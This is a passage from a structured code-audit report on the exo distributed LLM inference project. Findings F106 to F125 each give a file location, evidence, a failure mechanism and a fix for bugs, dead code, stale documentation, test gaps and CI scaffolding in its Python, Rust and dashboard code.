**Mechanism.** On hosts with IPv6 disabled (ipv6.disable=1, many Docker/VM bridges, some corporate LANs that filter link-local multicast) `NetworkingHandle.new` fails at the `[::]` bind or discovery socket creation and exo cannot start even as a single node; on LANs that merely block multicast, nodes start but can never find each other and the operator has no CLI knob to point one node at another.

**Fix.** Re-enable `--bootstrap-peers` by translating it to zenoh `connect/endpoints` (`cfg.insert_json5("connect/endpoints", &json5_list_of("tcp/host:port"))`) and pass it through create_swarm; zenoh then handles retry/reconnect. Listen on both `tcp/[::]:port` and `tcp/0.0.0.0:port` (fall back to v4-only if the v6 bind fails) so the mesh works over IPv4 once a peer is known. Optionally add an IPv4 multicast Hello mirror (224.0.0.x) using the same wire format.

### F106 — Ranks sample independently with no agreement on the chosen token; any per-device logit difference desynchronises the cluster

*`src/exo/worker/engines/mlx/auto_parallel.py:189` — medium · effort M · finder-reported · lens `mlx-engine` · confidence 0.55*

**Evidence.** auto_parallel.py:188-192 only synchronises the *hidden state*: `output = mx.distributed.all_gather(output, group=self.group)[-output.shape[0]:]`; the final norm and lm_head then run locally on every rank. Each rank then samples on its own: generate.py:720-733 passes `sampler` into `stream_generate` on every rank, opt_batch_gen.py:81-90 samples per row on every rank, and determinism relies solely on `mx.random.seed(seed)` being issued identically (generate.py:547-548, batch_generate.py:182-183). Cross-rank agreement exists only for task lists and cancellations (utils_mlx.py:888-938 `mx_all_gather_tasks`, 833-840 `mx_any`); there is no collective on the sampled token, and termination (EOS, stop strings, `max_tokens`) is decided locally per rank (generate.py:745-757, 821-823; batch_generate.py:360-365).

**Mechanism.** exo explicitly targets heterogeneous clusters (model cards list `MlxMetal`, `MlxCuda`, `MlxCpu` backends together). Different GPUs/backends use different kernels and reduction orders, so bf16 logits can differ by an ULP between ranks; with temperature sampling (or even argmax on a near-tie) the ranks eventually pick different tokens. Rank 0 streams its own token while other ranks embed theirs in later steps (pipeline) or judge EOS on a different sequence; once one rank breaks out of the decode loop to `mx_barrier` while another is still inside a forward pass, collectives mismatch and the runner hangs until the supervisor kills it. Nothing detects the divergence.

**Fix.** Wrap the sampler so the token is chosen once: after sampling on every rank, `all_gather` the (B,) token array and take rank 0's slice (rank 0 is both the pipeline entry and the rank that streams `GenerationChunk`s), or `mx.distributed` broadcast from rank 0. Do this in one place (a `make_distributed_sampler(sampler, group)` used by both `mlx_generate` and `ExoBatchGenerator.submit`). Optionally add a cheap assertion path that all ranks agreed (all_gather + compare) under `-vv`.

### F107 — API.reset() closes the receiver the old _apply_state task is iterating and API.run has no except* guard, so an election can raise EventRouterClosedResourceError and crash the node

*`src/exo/api/main.py:307` — medium · effort S · merged into F41 · lens `concurrency` · confidence 0.35*

Duplicate of F41, kept for readers arriving from the `concurrency` lens.

**Evidence.** api/main.py:298-310 `reset`: `self.event_receiver.close(); self.event_receiver = event_receiver; self._tg.start_soon(self._apply_state)` while the previous `_apply_state` task (api/main.py:1970-1972 `with self.event_receiver as events: async for i_event in events:`) may still be running. anyio 4.11 `receive()` calls `checkpoint()` then `receive_nowait()`, and `receive_nowait` raises `ClosedResourceError` first if the receiver was closed (here the EventRouter-tagged subclass, event_router.py:36-39). api/main.py:1910-1928 `run` wraps the task group in `try/finally` only; compare worker/main.py:116-118 and master/main.py:158-160 which have `except* (EventRouterBrokenResourceError, EventRouterClosedResourceError)`. `reset` is called from main.py:270-271 during `_elect_loop`.

**Mechanism.** During a master change, `_elect_loop` shuts the old EventRouter down, waits for the worker to stop, then calls `api.reset`. If the old `_apply_state` still has buffered events (it yields at a checkpoint between each) when `reset` closes its receiver, its next `receive()` raises `EventRouterClosedResourceError`, which escapes `_apply_state`, tears down the API task group (including the hypercorn server), and propagates through the Node task group so the whole process exits with 'EXO terminated due to unhandled exception'. The other components were given the guard; the API was not.

**Fix.** Do not close a stream another task is consuming: keep a per-run `CancelScope` for `_apply_state` (or store the task's receiver locally) and cancel/await it in `reset` before starting the new one, and add the same `except* (EventRouterBrokenResourceError, EventRouterClosedResourceError)` handling to `_apply_state`/`API.run` so a closed event plane never escalates to a node crash.

### F108 — Dashboard has zero automated tests; pure functions with subtle regex logic (LaTeX preprocessor, SSE parser, topology transform, model-family derivation claimed to mirror Python) are unverified

*`dashboard/package.json:6` — low · effort M · finder-reported · lens `dashboard` · confidence 1.00*

**Evidence.** `"scripts": { "dev", "build", "preview", "prepare", "check" }` — no `test`; devDependencies contain no vitest/playwright/testing-library. `find dashboard/src -name '*.test.*' -o -name '*.spec.*'` returns nothing. model_family.ts:1 and :28 state `// Mirrors src/exo/shared/models/model_cards.py:derive_base_model` / `derive_family` with no test pinning the two implementations together. CLAUDE.md's pre-commit checklist runs `uv run pytest` only for Python.

**Mechanism.** The backslash-stripping regression in MarkdownContent (finding above) and any drift between `deriveFamily` and the Python `derive_family` (which would mis-group models in the picker sidebar) ship undetected; contributors have no harness to add a regression test to, so fixes to the LaTeX pipeline or `parseSSEStream` can't be locked in.

**Fix.** Add vitest (`"test": "vitest run"`) and wire it into `nix flake check`/CI. Start with table-driven tests for `preprocessLaTeX` (code fences with `\n`, `$` currency vs math, `\textbf{<b>}` escaping), `parseSSEStream` (chunk boundaries mid-line, `: prefill_progress` comments, `[DONE]`), `transformTopology` (connections map shapes), and a fixture shared with the Python tests for `deriveFamily`/`deriveBaseModel`.

### F109 — AGENTS.md/CLAUDE.md (the file agents are told to obey) names a Rust crate that does not exist, mislabels the election as a bully algorithm, and calls the transport gossipsub

*`AGENTS.md:103` — low · effort S · finder-reported · lens `dead-code-drift` · confidence 0.95*

**Evidence.** AGENTS.md:101-103: '`networking`: zenoh networking (gossipsub, peer discovery)' and '`system_custodian`: System-level operations'. Cargo.toml:83 `members = ["rust/exo_rs", "rust/networking"]`; grep for system_custodian across .md/.nix/.toml/.py/.rs hits only AGENTS.md and docs/architecture.md:435 (which calls it out as stale). AGENTS.md:75 'Election: Bully algorithm'; src/exo/shared/election.py:21-26 defines one message type and `_campaign` (187-243) just does `elected = max(candidates)` after a sleep — no OK/COORDINATOR/ELECTION triad. No gossipsub exists: rust/networking/src/swarm.rs:1 '//! Compat shim for the old libp2p code', all pub/sub is zenoh `declare_publisher`/`declare_subscriber` (swarm.rs:152-180). AGENTS.md and CLAUDE.md are byte-identical (diff).

**Mechanism.** CLAUDE.md is loaded into every agent session (this one included) with 'These instructions OVERRIDE any default behavior'. An agent asked to touch system-level operations will search for a system_custodian crate and either fabricate one or waste time; one asked to reason about failover will assume bully-algorithm guarantees (coordinator messages, explicit takeover) the code does not provide.

**Fix.** Remove the `system_custodian` bullet; replace 'gossipsub' with 'zenoh pub/sub + custom IPv6 multicast discovery'; describe the election as 'single-message max-over-ballots with 3 s rounds, seniority and Lamport clock' (or link docs/architecture.md §4). Since CLAUDE.md is a verbatim copy, make it a symlink or generate it from AGENTS.md so they cannot drift.

### F110 — rust/exo_rs/tests/test_python.py calls NetworkingHandle.new with the wrong arity and binds real ports; dummy.rs tests tokio, not exo

*`rust/exo_rs/tests/test_python.py:16` — low · effort S · finder-reported · lens `dead-code-drift` · confidence 0.95*

**Evidence.** rust/exo_rs/tests/test_python.py:16 `h = NetworkingHandle.new(os.urandom(16).hex().lstrip("0"), 52414, 52413)` — three positional args. The generated stub rust/exo_rs/exo_rs.pyi:37 is `def new(identity, namespace, listen_port, discovery_service_port)` (four required), matching networking.rs:66-72. The same test then sleeps 10 s publishing to a topic that was never subscribed (test_python.py:22-25) and `test_pidfile` locks a hard-coded `/tmp/lock.pid` (line 46). `uv run --offline pytest --collect-only rust/exo_rs/tests/test_python.py` collects both tests; CI only runs `pytest src` (.github/workflows/pipeline.yml:117) so they are never executed. rust/exo_rs/tests/dummy.rs:9-53 exercises only `tokio::sync::mpsc` channel drop semantics with no exo code.

**Mechanism.** Anyone running `uv run pytest rust` or the whole tree (AGENTS.md says `uv run pytest`) hits a TypeError immediately, then a 10 s test that opens UDP 52413 / TCP 52414 — colliding with a running exo on the same machine — and a leftover /tmp/lock.pid. The Rust test gives a false sense that exo_rs has coverage; `cargo test` passes without touching a single binding.

**Fix.** Delete test_python.py and dummy.rs, or fix the call to the 4-arg signature, use `tmp_path` for the pidfile, mark the socket test `@pytest.mark.slow`, and add one real assertion (e.g. subscribe then publish yields a FromSwarm.Message on a second handle). Add `rust/exo_rs/tests` to `testpaths` only once it passes.

### F111 — PREFILL_TIMEOUT_SECONDS and DECODE_TIMEOUT_SECONDS are defined and never used; the supervisor has no runner liveness timeout

*`src/exo/worker/runner/supervisor.py:57` — low · effort S · merged into F35 · lens `dead-code-drift` · confidence 0.95*

Duplicate of F35, kept for readers arriving from the `dead-code-drift` lens.

**Evidence.** supervisor.py:57-58: `PREFILL_TIMEOUT_SECONDS = 60` / `DECODE_TIMEOUT_SECONDS = 5`. grep for TIMEOUT_SECONDS across src/exo finds no other reference to these two names; the only timeouts in supervisor.py are `initialize_timeout: float = 400` (line 208) and `anyio.move_on_after(0.5)` (line 307). The runner-side timeouts that do exist are different constants in runner.py:60-61 (`PREFILL_PICKUP_TIMEOUT_SECONDS`, `PREFILL_FINISH_TIMEOUT_SECONDS`) and apply only to the disaggregated prefill path.

**Mechanism.** A maintainer debugging a hung generation (a peer dropped mid-collective, which the architecture doc says leaves the group waiting forever) reads these constants and concludes the supervisor will reap the runner after 5 s of no decode progress. It will not; the request hangs until the client disconnects. The constants are a documentation lie in code.

**Fix.** Delete both constants, or implement what they name: in RunnerSupervisor's event loop, track time since the last GenerationResponse for the active task and emit RunnerFailed with a diagnostic when it exceeds DECODE_TIMEOUT_SECONDS (PREFILL_TIMEOUT_SECONDS before the first token). Add a test with a stub runner that stops emitting.

### F112 — resolve_allow_patterns returns ["*"] before an unreachable try-block, leaving 80 lines of shard-aware download filtering dead while DownloadModel still carries shard metadata

*`src/exo/download/download_utils.py:844` — low · effort S · merged into F77 · lens `dead-code-drift` · confidence 0.95*

Duplicate of F77, kept for readers arriving from the `dead-code-drift` lens.

**Evidence.** download_utils.py:839-851: `async def resolve_allow_patterns(shard): # TODO: 'Smart' downloads are disabled because: ... return ["*"]` followed by `try: weight_map = await get_weight_map(...); return get_allow_patterns(weight_map, shard) except Exception: ...` — code after an unconditional return. `get_allow_patterns` and `extract_layer_num` (huggingface_utils.py:91-171) have no other callers (grep), so their layer-range logic, the `TODO(ciaran): temporary` component handling at 148-152, and their logging are all unreachable. Yet `DownloadModel` tasks carry `shard_metadata: ShardMetadata` (tasks.py:43-44) and apply.py:150-152 dedups downloads by model_id with a TODO saying shard_metadata 'will need to be used again'. docs/architecture.md:328-333 already documents that every node pulls the whole repository.

**Mechanism.** Readers of the download path (and the placement code that scores 'download warmth') assume per-shard downloads exist; changes to `get_allow_patterns` are silently no-ops and its tests, if any are added, test dead code. TODO.md item 8 (offline model copy) reasons about partial downloads that cannot occur.

**Fix.** Delete the code after `return ["*"]`, `get_allow_patterns`, `extract_layer_num`, and the `get_weight_map` import if unused elsewhere; rename `resolve_allow_patterns` to `all_files_pattern()` or inline `["*"]` at download_utils.py:884. Keep the three-reason comment as the rationale. If shard-aware downloads are wanted back, restore from git behind an explicit env flag with a test.

### F113 — apply_node_timed_out never removes node_identities or node_backends, so departed nodes accumulate in State forever

*`src/exo/shared/apply.py:333` — low · effort S · finder-reported · lens `control-plane` · confidence 0.90*

**Evidence.** apply.py:288-347 rebuilds last_seen, downloads, node_memory, node_disk, node_system, node_network, node_thunderbolt, node_thunderbolt_bridge and node_rdma_ctl without `event.node_id`, but the `model_copy(update=...)` at 333-347 has no entry for `node_identities` (state.py:55) or `node_backends` (state.py:63), both of which are populated per node in `apply_node_gathered_info` (382-385, 396-399, 465-468). Node ids are random per process (router.py:239-240), so each restart is a new key.

**Mechanism.** Every node restart or departure leaves a permanent `NodeIdentity` (friendly name, model, chip, OS) and backend list in the replicated State, served by `/state` and rendered by the dashboard as a ghost device, and shipped in every snapshot/replay. Placement reads `node_backends.get(node_id)` (placement.py:191) only for cycle members so it is not mis-placing, but State grows monotonically for the session lifetime.

**Fix.** Filter `node_identities` and `node_backends` by `key != event.node_id` in `apply_node_timed_out` and include them in the update. Add a test in `src/exo/shared/tests/test_apply/` that populates every `Mapping[NodeId, ...]` field for a node, applies `NodeTimedOut`, and asserts the node is absent from all of them (iterate `State.model_fields` so new mappings are covered automatically).

### F114 — Replayed (stale) events make every up-to-date node fire a RequestEventLog nack, amplifying replay traffic and inflating the commands_seen tiebreaker

*`src/exo/routing/event_router.py:136` — low · effort S · finder-reported · lens `control-plane` · confidence 0.90*

**Evidence.** event_router.py:125-142: `buf.ingest(...)` silently discards `idx < next_idx_to_release` (event_buffer.py:19-20), then `drained = buf.drain_indexed()` is `[]`, and `if not drained and (self._nack_cancel_scope is None or self._nack_cancel_scope.cancel_called): self._tg.start_soon(self._nack_request, buf.next_idx_to_release)`. Harness: a node with `next_idx_to_release == 3` that received replayed indices 0..2 emitted `RequestEventLog(since_idx=3)` at t=0.61 s. Replays are broadcast to all nodes (master/main.py:462, topics.py:40); every command increments `commands_seen` on every node (election.py:182-185), which orders ElectionMessages (election.py:33-34).

**Mechanism.** Each 1000-event replay batch for one joiner makes every other node send one or two nacks (backing off 0.5 s to 10 s). The master reads and decodes the log for each; if that node is even slightly behind it re-broadcasts up to 1000 events again, which triggers the next wave. The nack commands also skew `commands_seen` between partitions that happened to observe different replay bursts.

**Fix.** Only request a replay when the inbound event is ahead of the release point: `if not drained and event.origin_idx > buf.next_idx_to_release and (...)`, or check `buf.store` is non-empty. Add an EventRouter test that stale events never produce a RequestEventLog.

### F115 — Streaming chat chunks are tagged object="chat.completion" instead of "chat.completion.chunk"

*`src/exo/api/adapters/chat_completions.py:203` — low · effort S · finder-reported · lens `api-compat` · confidence 0.90*

**Evidence.** `ChatCompletionResponse.object: Literal["chat.completion"] = "chat.completion"` (api.py:155) is the only response model, and it is reused for every streamed delta in chunk_to_response (chat_completions.py:203-215) and for tool-call deltas (256-271). Every delta also sets `role="assistant"` (199, 201) and the tool-call frame merges the tool_calls delta with `finish_reason="tool_calls"` in one chunk (267).

**Mechanism.** OpenAI streams `object: "chat.completion.chunk"`. Clients that discriminate on `object` (LiteLLM proxies re-serving exo, some Go/Rust SDKs, schema validators like the Vercel AI SDK's zod schemas when strict) mis-classify or reject the stream. Emitting `role` on every delta and combining the final tool_calls delta with finish_reason deviates from the reference shape that incremental tool-call accumulators expect.

**Fix.** Add `ChatCompletionChunk` with `object: Literal["chat.completion.chunk"]` and use it in generate_chat_stream; set `role` only on the first delta; after the tool_calls delta emit a separate chunk with empty delta and `finish_reason="tool_calls"` (and usage) to match OpenAI.

### F116 — libp2p-era archaeology in live code: dead topic constants with wrong values, get_node_zid ignores its argument and carries a dead Keypair body, gossipsub_* API whose docstring promises an error that is never raised

*`src/exo/shared/constants.py:83` — low · effort M · finder-reported · lens `dead-code-drift` · confidence 0.90*

**Evidence.** constants.py:82-86 `# libp2p topics for event forwarding` / `LIBP2P_LOCAL_EVENTS_TOPIC = "worker_events"` / `LIBP2P_ELECTION_MESSAGES_TOPIC = "election_message"` — unreferenced anywhere (grep), and the real topic names are `local_events` and `election_messages` (src/exo/routing/topics.py:40-51). router.py:232-264 `get_node_zid(path: Path = EXO_NODE_ZID)` returns `NodeId(os.urandom(16).hex().lstrip("0"))` on line 240 and never reads `path`; lines 242-264 are a string literal containing an old implementation using `FileLock` and `Keypair` (neither imported), docstring says 'Obtains the Keypair ... Obtain the PeerId'. `EXO_NODE_ZID` (constants.py:79) exists only to be that ignored default; test_node_id_persistence.py:77 is `@mark.skip`. rust/exo_rs/exo_rs.pyi:51-56 / networking.rs:165-168: 'Publishes ... to the GossipSub network. If no peers are found that subscribe to this topic, throws NoPeersSubscribedToTopicError' — swarm.rs:121-126 returns `Ok(())` for an unknown topic with '// TODO: this should be an error'. swarm.rs:72-83 computes `zid` from the liveliness key only to log it and yields `FromSwarm::Discovered {}` with no identity, so Python's ConnectionMessage (connection_message.py:8-9) is a bare bool. worker/main.py:405-409 builds `Multiaddr(address=f"/ip4/{ip}/tcp/{self.api_port}")` under two '# nonsense multiaddr' comments.

**Mechanism.** Readers grep for the wrong topic names, assume node identity is persisted (README/docs and the constant suggest it) when a restart in fact produces a new NodeId and a 30 s zombie entry, and rely on a publish error that cannot happen (a publish during the window before Router.run's subscribe loop at router.py:164-166 is silently dropped). The identity-free connection signal is why every join/leave forces a 3 s cluster-wide election regardless of which peer changed.

**Fix.** Delete `LIBP2P_*_TOPIC`, `EXO_NODE_ZID`, the string body and the `path` parameter of get_node_zid (rename to `generate_node_id`), and the skipped test. Rename `gossipsub_subscribe/publish/unsubscribe` to `subscribe/publish/unsubscribe` and fix the docstrings; make publish-to-unregistered-topic return an error as the TODO says, and have Router register+subscribe before starting TopicRouters. Carry `zid` in `FromSwarm::Discovered/Expired` and `ConnectionMessage` so Election can ignore irrelevant peers later. Replace `Multiaddr` on SocketConnection with the existing `Host` type.

### F117 — Discovery wire protocol and swarm shim have zero tests; CI's cargo-nextest only runs a tokio channel toy

*`rust/networking/src/discovery.rs:137` — low · effort S · finder-reported · lens `rust-transport` · confidence 0.90*

**Evidence.** The only Rust test in the workspace is rust/exo_rs/tests/dummy.rs (`test_drop_channel`, a tokio mpsc smoke test with no exo code). rust/parts.nix:125-131 runs `craneLib.cargoNextest ... --workspace`, so CI exercises nothing in rust/networking. `Discovery::respond` (discovery.rs:137-239) is a pure function of (bytes_read, addr, buf) with eight distinct drop branches (magic, kind, size, own nonce, namespace, stale nonce, v4 addr, self zid), and `Hello`/`WhatsUp` layout is fixed by `#[repr(C)] Pod` structs (311-339) whose sizes define compatibility between exo versions.

**Mechanism.** Changes to the header, nonce handling, or namespace hashing (lib.rs:61-65) cannot be caught before shipping; a one-byte layout change silently makes two exo versions invisible to each other, which the docs already warn is a dead-end with only trace-level logging.

**Fix.** Add `#[cfg(test)]` unit tests in discovery.rs that build `Hello`/`WhatsUp` via `.alloc()` and assert `respond()` outcomes for each branch, pin `Hello::buf_size()==20` and `WhatsUp::buf_size()==30`, and test `is_valid_zid` edge cases (empty, leading 0, 33 chars). A two-node in-process test of `Discovery::new` over loopback multicast (skipped when the group is unjoinable) would cover announce/reply end-to-end.

### F118 — Stale build scaffolding: composite actions call just recipes that do not exist, the polished DMG script is not used by the release, and the workflow sets an env var the runtime rejects

*`.github/actions/unit-test/action.yml:11` — low · effort S · finder-reported · lens `build-deps` · confidence 0.90*

**Evidence.** .github/actions/unit-test/action.yml:10-11 `nix develop -c just sync-clean` / `just test-fast`; lint-check/action.yml:9 `just lint-check`; regenerate-protobufs/action.yml:9 `just regenerate-protobufs` — justfile:3-49 defines only default/all/fmt/lint/test/check/sync/sync-clean/rust-rebuild/build-dashboard/package/build-app/clean, and neither workflow references `.github/actions/`. build-app.yml:416-422 builds the DMG with a bare `hdiutil create -volname "EXO" -srcfolder dmg-root -ov -format UDZO`, while packaging/dmg/create-dmg.sh (+ generate-background.py, background.png) implements the branded layout and is called from nowhere. build-app.yml:37 `EXO_LIBP2P_NAMESPACE: ${{ github.ref_name }}` while src/exo/main.py:343-346 `if os.getenv("EXO_LIBP2P_NAMESPACE"): raise ValueError("EXO_LIBP2P_NAMESPACE has been removed - use EXO_ZENOH_NAMESPACE instead")`; README.md:342 still documents `EXO_LIBP2P_NAMESPACE=my-dev-cluster uv run exo`.

**Mechanism.** A contributor wiring `.github/actions/unit-test` into a workflow gets `error: Justfile does not contain recipe 'test-fast'`; someone running `./packaging/dmg/create-dmg.sh` expects it to match what ships and it does not (the released DMG has no background/icon layout); anyone following README:342 gets a ValueError at startup. Each is a small time sink, but together they make the packaging surface untrustworthy as documentation of what the release actually does.

**Fix.** Delete `.github/actions/` (or restore the missing recipes and use the actions from pipeline.yml). Either call `packaging/dmg/create-dmg.sh output/EXO.app "$DMG_NAME"` from build-app.yml:416 or delete `packaging/dmg/`. Remove build-app.yml:37 (a build-time env var never reaches the shipped app anyway) and fix README:342 to `EXO_ZENOH_NAMESPACE`.

### F119 — Dashboard type-checking (`svelte-check`) is defined but never executed in CI or nix checks

*`dashboard/dashboard.nix:40` — low · effort S · finder-reported · lens `build-deps` · confidence 0.90*

**Evidence.** dashboard/package.json:11 `"check": "svelte-kit sync && svelte-check --tsconfig ./tsconfig.json"`. dashboard/dashboard.nix:38-42 buildPhase runs only `npm run build` (vite build, which transpiles without type-checking). dashboard/parts.nix:95-107 exposes `packages.dashboard` and `packages.prettier-svelte` but no `checks.*`; pipeline.yml has no npm/node step, and `nix flake check` (:104) therefore never runs svelte-check. The dashboard is 3.6k+6.7k-line TS/Svelte files (locator).

**Mechanism.** A TypeScript or Svelte type error in `dashboard/src` still produces a `build/` directory, so CI is green and the error only surfaces at runtime in the browser (undefined property, wrong store shape after an API type change). The `prettier` formatting check runs through treefmt, so contributors reasonably assume the dashboard is being validated when only its formatting is.

**Fix.** In dashboard/parts.nix add `checks.dashboard-check = pkgs.runCommand "dashboard-check" { nativeBuildInputs = [ pkgs.nodejs ]; } ''cp -r ${dashboardSrc}/dashboard . && cd dashboard && ln -s ${dashboardDeps}/lib/node_modules/exo-dashboard/node_modules node_modules && npm run check && touch $out''` (reusing the existing `dashboardDeps` derivation so it is cheap), so `nix flake check` fails on dashboard type errors.

### F120 — Global RNG is re-seeded on every batch submit, resetting sampling for in-flight requests; seed=0 is treated as unset

*`src/exo/worker/engines/mlx/generator/batch_generate.py:183` — low · effort S · finder-reported · lens `mlx-engine` · confidence 0.85*

**Evidence.** batch_generate.py:182-183 `seed = task_params.seed if task_params.seed is not None else 42; mx.random.seed(seed)` runs inside `submit()` for each new request while other rows are still decoding in the shared `MlxBatchGenerator`; the samplers built at 185-192 draw from the global `mx.random` state (sample_utils `categorical_sampling`). generate.py:547 uses `seed = task.seed or 42`, so an explicit `seed=0` becomes 42.

**Mechanism.** A client that sets `seed` to reproduce an output gets a different continuation whenever another request is submitted mid-generation, because the global stream is reset under it; conversely a request without a seed is perturbed to a fixed 42-stream by neighbours. The behaviour differs between the sequential and batch engines and is not visible to users. Ranks stay consistent (all re-seed identically), so this is a reproducibility rather than a safety issue.

**Fix.** Give each request its own key: create `key = mx.random.key(seed)` per request and have the sampler split it per step (`mx.random.categorical(logits, key=k)` via a custom sampler wrapper) instead of touching the global state; when no seed is given, derive one from `uuid4` and report it. Use `is not None` in `mlx_generate` too.

### F121 — image_edits silently discards malformed advanced_params (seed, steps, guidance), so callers get non-deterministic results while believing their seed was applied

*`src/exo/api/main.py:1448` — low · effort S · finder-reported · lens `security` · confidence 0.85*

**Evidence.** `image_edits` (main.py:1425-1470) and `bench_image_edits` (1497-1520): `if advanced_params: with contextlib.suppress(Exception): parsed_advanced_params = AdvancedImageParams.model_validate_json(advanced_params)` (1448-1451, 1504-1507). On any validation error `parsed_advanced_params` stays `None`, and `_send_image_edits_command` then does `advanced_params = _ensure_seed(advanced_params)` (1370) which generates a random seed. `stream`/`partial_images` are also parsed leniently (`int(partial_images) if partial_images.isdigit() else 0`, 1443).

**Mechanism.** A client posts `advanced_params={"seed": "42", "num_inference_steps": 20}` (string seed, common from multipart form encoders) or uses a field name the strict model rejects; the request succeeds with a random seed and default steps. Benchmarks via `/bench/images/edits` become irreproducible and users cannot tell why 'the same seed' gives different images. `/v1/images/generations` (JSON body) correctly returns 422 for the same payload, so the two endpoints behave inconsistently.

**Fix.** Replace the `suppress(Exception)` blocks with `try: ... except ValidationError as exc: raise HTTPException(status_code=422, detail=exc.errors())`. Do the same for `partial_images` (`int()` in try/except → 422). Factor the shared parsing into one `_parse_image_edit_form()` helper used by both handlers.

### F122 — apply_node_gathered_info deep-copies the rustworkx topology (pickle round-trip) for every 1 Hz telemetry event on every replica

*`src/exo/shared/apply.py:351` — low · effort S · finder-reported · lens `performance` · confidence 0.85*

**Evidence.** apply.py:350-352: `topology = copy.deepcopy(state.topology); topology.add_node(event.node_id)` runs for every `NodeGatheredInfo`, including `MacmonMetrics`/`MemoryUsage` variants that never touch edges (364-372); `add_node` is a no-op for known nodes (topology.py:61-63). info_gatherer.py:447-456 emits macmon at 1 Hz (macOS) or memory at 1 Hz (Linux) per node plus 5 s/10 s/30 s pollers. Each event is applied on the master (master/main.py:519), the worker replica (worker/main.py:144) and the API replica (api/main.py:1974) of every node. Measured in the repo venv: `copy.deepcopy` of a 10-node/180-edge Topology = 1.5 ms vs `PyDiGraph.copy()` = 0.004 ms.

**Mechanism.** With N nodes each node deep-copies the whole graph ~N times per second per replica (2-3 replicas), i.e. ~30-45 ms/s of CPU at 10 nodes with ~180 edges, growing roughly with N x edges (edges scale with N^2 x interfaces); at 20 meshed nodes that is &gt;100 ms/s per node spent pickling and unpickling frozen edge models on the loop that streams tokens. The same pattern is used in apply_node_timed_out/topology_edge_* (288-289, 473-474, 479-480).

**Fix.** Add `Topology.copy()` that does `self._graph.copy()` and copies `_vertex_indices` (edge/node payloads are frozen pydantic models, safe to share) and use it in apply.py instead of `copy.deepcopy`; in `apply_node_gathered_info` skip the copy entirely when `state.topology.contains_node(event.node_id)` and the info variant is not MacThunderboltConnections/RdmaCtlStatus.

### F123 — Dead Python modules, types and CLI fields left in the shipped package (reactive.py, fs.py, phantom.py, NoopShardDownloader, Args.tb_only, and a dozen more)

*`src/exo/utils/reactive.py:13` — low · effort M · finder-reported · lens `dead-code-drift` · confidence 0.85*

**Evidence.** A whole-repo reference scan (src, tests, bench, tools, scripts) finds each of these defined exactly once and never referenced: `Reactive` (utils/reactive.py — whole module unused, only importer of exo.utils.* is `from exo.utils.fs import ensure_parent_directory_exists`), `delete_if_exists`/`ensure_directory_exists`/`make_temp_path` (utils/fs.py:12-32), `PhantomData`/`todo()`/`ensure_type()` (utils/__init__.py:11-21, utils/phantom.py), `NoopShardDownloader` (download/shard_downloader.py:58 — `--no-downloads` sets `download_coordinator = None` at main.py:81-90 rather than using it), `seed_models` (download_utils.py:260), `mlx_cleanup` (utils_mlx.py:821), `get_available_memory` (cache.py:549), `infer_tool_parser` (tool_parsers.py:240), `str_to_mx_dtype` (disaggregated/adapter.py:53), `PartialImageResponse`/`PrefillProgressResponse` (runner_response.py:44, 78), `RunnerError` (runners.py:16), `BenchChatCompletionMessage`/`DeleteInstanceTaskParams` (api/types/api.py:97, 294), `MAX_KV_SIZE`/`KEEP_KV_SIZE` (engines/mlx/constants.py:8-9), `EXO_TEST_LOG` (constants.py:75), `EXO_OFFLINE` constant (constants.py:100 — main.py:388/445 re-read the env var instead), `Args.tb_only` (main.py:385, no argparse source). `Args.spawn_api: bool = False` (main.py:383) contradicts argparse `--no-api` `store_false` whose default is True, so the model default never applies.

**Mechanism.** Each of these is a false affordance: a maintainer wiring `--no-downloads` looks for where NoopShardDownloader is used and finds a different mechanism; someone tuning KV cache size edits MAX_KV_SIZE and sees no effect; `Args.spawn_api=False` reads as 'API off by default' when it is on. Unused runner-response types widen the discriminated union the runner's event channel must validate against.

**Fix.** Delete the listed symbols and modules (keep `ensure_parent_directory_exists`). Set `spawn_api: bool = True` or drop the model defaults entirely since argparse always supplies every field. Add `basedpyright`'s `reportUnusedFunction`/`reportUnusedClass` or a periodic `vulture src/exo --min-confidence 80` step to the justfile so this list does not regrow.

### F124 — exo_rs carries unused extension traits and crate dependencies, and turns --zenoh-port 0 into a Rust panic instead of a Python error

*`rust/exo_rs/src/lib.rs:84` — low · effort S · finder-reported · lens `dead-code-drift` · confidence 0.85*

**Evidence.** rust/exo_rs/src/lib.rs:84-143 defines `TokioRuntimeExt::spawn_with_scope`, `TokioMpscReceiverExt::{recv_py, recv_many_py, try_recv_py}` and `PyResultExt::write_unraisable`; grep across rust/exo_rs/src shows zero call sites (only the definitions). lib.rs:8 `// mod ident;` and :161 `// m.add_class::<PyKeypair>()?;` are leftovers. rust/exo_rs/Cargo.toml:46-53 lists `env_logger`, `rand`, `serde_json`, `parking_lot`, `zenoh` as dependencies; the only `use` lines in the crate are for extend, tokio, futures_lite, pin_project, pyo3*, networking. Workspace deps `nix = "0.31"` and `delegate` (Cargo.toml:112, 115) are referenced by no member. networking.rs:73-76: `if listen_port == 0 { todo!("cannot listen on port 0 yet"); }` and lib.rs:26 `assert!(listen_port != 0, ...)` — `--zenoh-port` is `type=int` with no validation (main.py:475-480). rust/exo_rs/README.md is 'TODO: do something here....'.

**Mechanism.** `uv run exo --zenoh-port 0` raises `pyo3_runtime.PanicException: not yet implemented: cannot listen on port 0 yet` out of `Node.create`, after the PID file is written; unwinding through PyO3 rather than a ValueError with the flag name. Unused deps lengthen every cold Rust build (env_logger, serde_json, zenoh linked twice) and the clippy `todo = "warn"` lint (Cargo.toml:244) is being tolerated on a user-reachable path.

**Fix.** Return `PyValueError::new_err("zenoh listen port must be non-zero")` in `PyNetworkingHandle::new` and validate `--zenoh-port`/`--discovery-port` as `PositiveInt` in Args; remove the unused ext traits, the commented-out ident/Keypair lines, and the unused `[dependencies]`; run `cargo +nightly udeps` or `cargo machete` in `nix flake check` to keep the manifest honest; write a two-paragraph README or delete it.

### F125 — storage_manager plugin (with 2 s replication) and adminspace are enabled but nothing in the repo uses them

*`rust/networking/src/lib.rs:39` — low · effort S · merged into F88 · lens `rust-transport` · confidence 0.85*

Duplicate of F88, kept for readers arriving from the `rust-transport` lens.

